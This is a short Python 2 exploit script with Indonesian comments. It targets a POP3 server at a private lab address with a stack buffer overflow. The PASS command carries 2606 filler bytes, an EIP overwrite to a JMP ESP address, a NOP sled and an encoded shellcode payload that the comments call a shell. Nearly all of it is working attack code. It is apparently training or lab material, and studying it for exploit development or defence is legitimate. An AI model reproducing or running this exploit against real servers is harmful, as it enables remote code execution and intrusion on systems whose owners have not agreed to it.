#!/usr/bin/python

import socket

password_awal="C"*2606 #buat karakter c sebanyak 2606
eip="\x8F\x35\x4A\x5F" #isi register EIP dengan alamat memory yang menyimpan instruksi JMP ESP
softnop="\x90"*10
password_akhir=("\xb8\xa9\xc5\x4a\xe4\xdb\xcf\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x4f\x31\x42\x14\x03\x42\x14\x83\xea\xfc\x4b\x30\xb6" +
"\x0c\x02\xbb\x47\xcd\x74\x35\xa2\xfc\xa6\x21\xa6\xad\x76" +
"\x21\xea\x5d\xfd\x67\x1f\xd5\x73\xa0\x10\x5e\x39\x96\x1f" +
"\x5f\x8c\x16\xf3\xa3\x8f\xea\x0e\xf0\x6f\xd2\xc0\x05\x6e" +
"\x13\x3c\xe5\x22\xcc\x4a\x54\xd2\x79\x0e\x65\xd3\xad\x04" +
"\xd5\xab\xc8\xdb\xa2\x01\xd2\x0b\x1a\x1e\x9c\xb3\x10\x78" +
"\x3d\xc5\xf5\x9b\x01\x8c\x72\x6f\xf1\x0f\x53\xbe\xfa\x21" +
"\x9b\x6c\xc5\x8d\x16\x6d\x01\x29\xc9\x18\x79\x49\x74\x1a" +
"\xba\x33\xa2\xaf\x5f\x93\x21\x17\x84\x25\xe5\xc1\x4f\x29" +
"\x42\x86\x08\x2e\x55\x4b\x23\x4a\xde\x6a\xe4\xda\xa4\x48" +
"\x20\x86\x7f\xf1\x71\x62\xd1\x0e\x61\xca\x8e\xaa\xe9\xf9" +
"\xdb\xcc\xb3\x95\x28\xe2\x4b\x66\x27\x75\x3f\x54\xe8\x2d" +
"\xd7\xd4\x61\xeb\x20\x1a\x58\x4b\xbe\xe5\x63\xab\x96\x21" +
"\x37\xfb\x80\x80\x38\x90\x50\x2c\xed\x36\x01\x82\x5e\xf6" +
"\xf1\x62\x0f\x9e\x1b\x6d\x70\xbe\x23\xa7\x07\xf9\xb4\xe4" +
"\x08\xc5\xc5\x9d\x2a\xc5\xd4\x01\xa2\x23\xbc\xa9\xe2\xfc" +
"\x29\x53\xaf\x76\xcb\x9c\x65\x1e\x68\x0e\xe2\xde\xe7\x33" +
"\xbd\x89\xa0\x82\xb4\x5f\x5d\xbc\x6e\x7d\x9c\x58\x48\xc5" +
"\x7b\x99\x57\xc4\x0e\xa5\x73\xd6\xd6\x26\x38\x82\x86\x70" +
"\x96\x7c\x61\x2b\x58\xd6\x3b\x80\x32\xbe\xba\xea\x84\xb8" +
"\xc2\x26\x73\x24\x72\x9f\xc2\x5b\xbb\x77\xc3\x24\xa1\xe7" +
"\x2c\xff\x61\x17\x67\x5d\xc3\xb0\x2e\x34\x51\xdd\xd0\xe3" +
"\x96\xd8\x52\x01\x67\x1f\x4a\x60\x62\x5b\xcc\x99\x1e\xf4" +
"\xb9\x9d\x8d\xf5\xeb")# program shell atau PAYLOAD kita


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	#definisikan koneksi TCP/IP soket

print "\nBerkomunikasi dengan POP3.....\n"
connect=s.connect(('172.16.192.130',110))		#Koneksi ke POP3 server
data=s.recv(1024)					#pesan balasan dari server
print data						#print ke layar supaya kita tau statusnya

s.send('USER adinanta\r\n')				#kirim username adinanta (username apa aja bisa)
data=s.recv(1024)					#pesat balasan server
s.send('PASS '+password_awal+eip+softnop+password_akhir+'\r\n')	#kirim string password ke server
s.send('QUIT\r\n')					#keluar dari komunikasi pop3
s.close()						#putus tcp/ip connection
